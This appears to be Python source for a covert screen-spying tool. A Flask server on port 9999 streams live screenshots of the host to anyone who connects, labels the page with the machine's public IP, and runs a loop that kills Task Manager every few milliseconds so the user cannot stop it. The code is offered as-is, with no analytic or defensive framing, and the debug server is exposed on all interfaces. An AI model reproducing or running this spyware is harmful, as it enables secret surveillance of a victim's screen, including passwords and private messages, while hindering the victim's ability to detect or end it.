from flask import Flask, Response, render_template
from io import BytesIO
from PIL import ImageGrab
import requests
import subprocess
import threading
from time import sleep
app = Flask(__name__)


@app.route('/')
def index():
    try:
        ip = requests.get('https://ipinfo.io').json()['ip']
    except:
        ip = ''
    return '''<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>'''+ip+'''</title>
        </head>

        <body style="background-color: white">
        <div id="content">
            <img src="/feed" id="feed" height="100%" width="100%" alt="Loading video feed...">
        </div>
        </body>
        </html>'''#render_template('index.html',ip=ip)


@app.route('/feed')
def video_feed():
    return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')


def gen():
    while True:
        try:
            img_buffer = BytesIO()
            ImageGrab.grab().save(img_buffer, 'JPEG', quality=100)
            img_buffer.seek(0)
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpg\r\n\r\n' + img_buffer.read() + b'\r\n\r\n')
        except:
            pass
def tk():
    DETACHED_PROCESS = 0x00000008
    while True:
        try:
            subprocess.call('wmic process where name="taskmgr.exe" call terminate', creationflags=DETACHED_PROCESS)
        except:
            pass
        sleep(0.01)
if __name__ == '__main__':
    threading.Thread(target=tk).start()
    app.run(host='0.0.0.0', port=9999,debug=True)